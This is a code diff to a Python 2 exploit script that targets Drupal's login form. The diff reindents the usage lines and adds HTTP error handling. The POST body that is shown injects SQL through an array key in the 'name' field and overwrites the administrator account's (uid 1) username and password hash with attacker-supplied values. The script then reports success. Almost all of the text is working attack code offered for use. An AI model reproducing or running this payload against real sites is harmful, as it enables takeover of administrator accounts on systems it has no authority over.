@@ -8,9 +8,9 @@
 import urllib2,sys
 from drupalpass import DrupalHash # https://github.com/cvangysel/gitexd-drupalorg/blob/master/drupalorg/drupalpass.py
 if len(sys.argv) != 4:
-    print "host username password"
-    print "http://example.com/ admin new_pass"
-    sys.exit(1)
+  print "host username password"
+  print "http://example.com/ admin new_pass"
+  sys.exit(1)
 host = sys.argv[1]
 user = sys.argv[2]
 password = sys.argv[3]
@@ -21,8 +21,13 @@ post_data = "name[0%20;update+users+set+name%3d\'" \
             +"'+,+pass+%3d+'" \
             +hash[:55] \
             +"'+where+uid+%3d+\'1\';;#%20%20]=bob&name[0]=larry&pass=lol&form_build_id=&form_id=user_login_block&op=Log+in"
-print post_data
-content = urllib2.urlopen(url=target, data=post_data).read()
+print "POST: ", post_data
+content = ''
+try:
+  content = urllib2.urlopen(url=target, data=post_data).read()
+except urllib2.HTTPError, err:
+  print 'HTTP Error:', err.code
+
 if "mb_strlen() expects parameter 1" in content:
         print "Success!\nLogin now with user:%s and pass:%s" % (user, password)
 else:
